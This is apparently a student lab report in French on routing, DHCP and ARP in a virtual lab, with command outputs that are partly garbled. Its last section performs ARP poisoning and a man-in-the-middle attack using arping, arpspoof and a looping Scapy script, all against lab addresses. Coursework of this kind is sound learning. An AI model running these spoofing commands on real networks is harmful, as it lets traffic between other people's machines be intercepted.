# TP2 : Routage, DHCP et DNS

# I. Routage
🌞 **Configuration de `router.tp2.efrei`**

Le ping fonctionne :
```
[root@localhost toto]# ping efrei.fr
PING efrei.fr (51.255.68.208) 56(84) bytes of data.
64 bytes from ns3028977.ip-51-255-68.eu (51.255.68.208): icmp_seq=1 ttl=61 time 18.5 ms
64 bytes from ns3028977.ip-51-255-68.eu (51.255.68.208): icmp_seq=2 ttl=61 time=22.3 ms
64 bytes from ns3028977.ip-51-255-68.eu (51.255.68.208): icmp_seq=3 ttl=61 time 23.7 ms
64 bytes from ns3028977.ip-51-255-68.eu (51.255.68.208): icmp_seq=4 ttl=61 time 24.3 ms
^C
efrei.fr ping statistics
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
```

La config :
```
[root@localhost toto]# ip a
1: 10: <LOOPBACK, UP, LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever
inet6:: 1/128 scope host valid_lft forever preferred_lft forever

2: enp0s3: <BROADCAST, MULTICAST, UP, LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 08:00:27:5f: 7:54 brd ffffffffffff
inet 10.2.1.254/24 brd 10.2.1.255 scope global nopref ixroute enp0s3
valid_lft forever preferred_lft forever inet6 fe80:: a00:27ff: fe5f: 7d54/64 scope link valid_lft forever preferred_lft forever

3: enp0s8: <BROADCAST, MULTICAST, UP, LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 08:00:27:d9:f1:c8 brd ffffffffffff
inet 192.168.122.49/24 brd 192.168.122.255 scope global dynamic nopref ixroute enpos8 valid_lft 3145sec preferred_lft 3145sec inet6 fe80:: 99ff:d312:ae06:7d23/64 scope link nopref ixroute valid_lft forever preferred_lft forever
```

🌞 **Configuration de `node1.tp2.efrei`**

```
root@localhost totol# ip a
1: 10: <LOOPBACK, UP, LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever
inet6:: 1/128 scope host valid_lft forever preferred_lft forever

2: enp0s3: <BROADCAST, MULTICAST, UP, LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 08:00:27:8d:55:5f brd ff ff ff ff ff ff
inet 10.2.1.1/24 brd 10.2.1.255 scope global nopref ixroute enpos3
valid_lft forever preferred_lft forever inet6 fe80::a00:27ff: fe8d: 555f/64 scope link valid_lft forever preferred_lft forever
```

```
root@localhost toto]# ping 10.2.1.254
PING 10.2.1.254 (10.2.1.254) 56(84) bytes of data.
64 bytes from 10.2.1.254: icmp_seq=1 ttl=64 time 3.17 ms
64 bytes from 10.2.1.254: icmp_seq=2 ttl=64 time-3.15 ms
64 bytes from 10.2.1.254: icmp_seq=3 ttl=64 time=2.67 ms
C
--- 10.2.1.254 ping statistics
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 2.666/2.994/3.167/0.232 ms
```

```
root@localhost toto]# cat /etc/sysconfig/network-scripts/ifcfg-enp0s3
DEVICE=enpos3
NAME=lan
ONBOOT-yes
BOOTPROTO-static
IPADDR=10.2.1.1
NETMASK-255.255.255.0
GATEWAY 10.2.1.254

[toto@localhost toto]# ping google.com
PING google.com (172.217.20.174) 56(84) bytes of data.
64 bytes from waw02s07-in-f174.1e100.net (172.217.20.174): icmp_seq=1 ttl=59 time=18.5 ms 64 bytes from waw02s07-in-f174.1e100.net (172.217.20.174): icmp_seq=2 ttl=59 time=23.0 ms
google.com ping statistics
2 packets transmitted, 2 received, 0% packet loss, time 1006ms
rtt min/avg/max/mdev = 18.519/20.777/23.036/2.258 ms
```

```
traceroute to google.com (142.250.201.174), 30 hops max, 60 byte packets
1 gateway (18.2.1.254) 4.431 ms 4.311 ms 4.030 ms
2 gns3vm (192.168.122.1) 6.451 ms 8.093 ms 8.199 ms
3 gateway (10.0.3.2) 9.869 ms 9.727 ms 19.348 ms
4 ***
5 ***
6 ae106-0.ncpoi201.rbci.orange.net (193.249.214.138) 28.941 ms 9.988 ms 9.993 ms
7 ***
8 ***
9 ***
10 74.125.50.250 (74.125.50.250) 21.847 ms 18.287 ms 19.860 ms
11 108.170.255.153 (108.170.255.153) 22.461 ms 22.547 ms *
12 142.251.49.132 (142.251.49.132) 21.521 ms 22.064 ms 142.251.64.125 (142.251.64.125) 20.991 ms
13 142.251.64.125 (142.251.64.125) 21.184 ms 192.178.96.136 (192.178.96.136) 21.883 ms par21s23-in-f14.1e100.net
```

🌞 **Afficher la CAM Table du switch**
```
10U1#show mac address-table
			Mac Address Table
---------------------------------------
Vlan  Mac Address   Type     Ports
----  ------------   -------  -----
1    0800.275f.7d54  DYNAMIC   Et0/1
1    0800.2780.555f  DYNAMIC   Et0/0
Total Mac Addresses for this criterion: 2
```

# II. Serveur DHCP
🌞 **Install et conf du serveur DHCP** sur `dhcp.tp2.efrei`
```
[root@localhost toto]# cat /etc/dhcp/dhcpd.conf
authoritative;
subnet 10.2.1.0 netmask 255.255.255.0{
	range 10.2.1.10 10.2.1.50;
	option broadcast-address 10.2.1.1;
	option routers 10.2.1.254;
}
```

🌞 **Test du DHCP** sur `node1.tp2.efrei`
```
[root@localhost toto]# nmcli connection up lan
Connection successfully activated (D-Bus active path:/org/freedesktop/NetworkManager/ActiveConnection/3)

[toto@localhost toto]# ip a
1: 10: <LOOPBACK, UP, LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
	link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
	inet 127.0.0.1/8 scope host lo
		valid_lft forever preferred_Ift forever
	inet6:: 1/128 scope host
		valid_lft forever preferred_lft forever

2: enp0s3: <BROADCAST, MULTICAST, UP, LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
	link/ether 08:00:27:8d:55:5f brd ffffffffffff
	inet 10.2.1.10/24 brd 10.2.1.255 scope global dynamic nopref ixroute enp0s3
		valid_lft 43197sec preferred_lft 43197sec
	inet6 fe80::a00:27ff: fe8d: 555f/64 scope link
		valid_lft forever preferred_lft forever
```

🌟 **BONUS**
Sur vpcs :
```
PC1> dhcp
DORA IP 10.2.1.11/24 GW 10.2.1.254

PC1> show ip
NAME        : PC1[1]
IP/MASK     : 10.2.1.11/24
GATEWAY     : 10.2.1.254
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 43228, 43233/21616/37828
MAC         : 00:50:79:66:68:00
LPORT       : 20006
RHOST:PORT  : 127.0.0.1:20007
MTU         : 1500
```

🌞 **Wireshark it !**
[Echange DORA](DORA.pcapng)
# III. ARP
## 1. Les tables ARP
🌞 **Affichez la table ARP de `router.tp2.efrei`**
```
[root@localhost toto]# ip neighbor show
10.2.1.253 dev enp0s3 lladdr 08:00:27:f1:68:a8 STALE
10.2.1.10 dev enp0s3 lladdr 08:00:27:8d:55:5f STALE
```

🌞 **Capturez l'échange ARP avec Wireshark**
[Echange ARP](ARP.pcapng)

## 2. ARP poisoning
🌞 **Envoyer une trame ARP arbitraire**
```
root@debian:/home/toto# arping -c 2s 55:55:55:55:55:55 10.2.1.10
ARPING 10.2.1.10
Timeout
Timeout
 --- 10.2.1.10 statistics ---
2 packets transmitted, 0 packets received, 100% unanswered (0 extra)
```

-> 10.2.1.10 pense que mon adresse mac est `55:55:55:55:55:55` YEEESSSSS !!!
ça sert à rien à par prouver que ARP est vulnérable *by design*.

🌞 **Mettre en place un ARP MITM**
```
root@debian:/home/toto# cat /etc/sysctl.conf | grep ip_forward
net.ipv4.ip_forward=1
```

```
root@debian:/home/toto# arpspoof -t 10.2.1.254 10.2.1.10 -r
```
"Fait moi passer pour 10.2.1.254 auprès de 10.2.1.10 et inversement."

Avant l'attaque : (machine node)
```
[root@localhost toto]# ip neigh
10.2.1.17 dev enpos3 lladdr 08:00:27:22:3c: af STALE
10.2.1.254 dev enpos3 lladdr 08:00:27:5f: 7:54 REACHABLE
```
Après l'attaque : (machine node)
```
[root@localhost toto]# ip neigh
10.2.1.17 dev enpos3 lladdr 08:00:27:22:3c: af STALE
10.2.1.254 dev enpos3 lladdr 08:00:27:22:3c:af STALE
```

🌞 **Capture Wireshark `arp_mitm.pcap`**
[ARP MITM](arp_mitm.pcapng)

🌞 **Réaliser la même attaque avec Scapy**!
```python
from scapy.all import *

pk = Ether(dst="08:00:27:8d:55:5f")/ARP (pdst="10.2.1.10", psrc="10.2.1.254")
pk2 = Ether(dst="08:00:27:d9:f1:c8")/ARP (pdst="10.2.1.254", psrc="10.2.1.10")

while True:
	sendp(pk, iface="enp0s3")
	sendp(pk2, iface="enp0s3")
```

